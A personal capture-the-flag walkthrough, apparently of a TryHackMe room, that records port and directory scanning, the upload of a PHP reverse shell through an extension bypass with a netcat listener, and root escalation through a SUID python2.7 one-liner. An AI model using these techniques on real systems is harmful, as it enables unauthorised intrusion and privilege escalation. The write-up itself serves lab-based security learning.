root@ip-10-201-77-237:~# sudo nmap -A -T4 -p- 10.201.38.231
sudo: unable to resolve host ip-10-201-77-237: Name or service not known
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-21 06:32 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.38.231
Host is up (0.00027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 10.201.38.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.65 seconds


root@ip-10-201-77-237:~# gobuster dir -u http://10.201.38.231 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html, .php, .json, .txt, .md, .js, .yaml
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.38.231
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 616]
/uploads              (Status: 301) [Size: 316] [--> http://10.201.38.231/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.201.38.231/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.201.38.231/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.201.38.231/panel/]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================


panel is an open upload fully arbitrary. we can upload any rev shell here

enumerating framework with error page shows


![[Pasted image 20251021020001.png]]

![[Pasted image 20251021020023.png]]

to me, this closest resembles apache / httpd so that doesn't really tell me much about what rev shell to upload

root@ip-10-201-77-237:~# curl -I http://10.201.38.231
HTTP/1.1 200 OK
Date: Tue, 21 Oct 2025 06:03:19 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=h17q5a8ev66o3qek6ivf09eap7; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8


okay now we are cooking with gas

https://github.com/pentestmonkey/php-reverse-shell

back to the monkey of pentesting

![[Pasted image 20251021020638.png]]

oh boy looks like it may be asking us to play with the extension or somthing like .php4 .php5 or just adding some random innocuous extension 

![[Pasted image 20251021024035.png]]

okay, figures. Classic CTF style .php5 works, lets's see if we can see it in /uploads

obv I set <nc -lnvp 1234> 



$ whoami
www-data
$ 


yeah figures

$ find / -name user.txt 2>/dev/null
/var/www/user.txt
$ cd /var/www/
$ ls
html
user.txt
$ cat user.txt
THM{y0u_g0t_a_sh3ll}
$      

$ sudo -L 
sudo: invalid option -- 'L'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ...

not sudo passwordless

$ find / -type f -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/bin/mount
/bin/su
/bin/fusermount
/bin/umount


ls -la /usr/bin/python2.7
-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7


root owned with SUID is good

went to GTFO bins and found this

python -c 'import os; os.system("/bin/sh")'

with modification to this

python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

it worked fine

root
cd /root
ls
root.txt
snap
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}

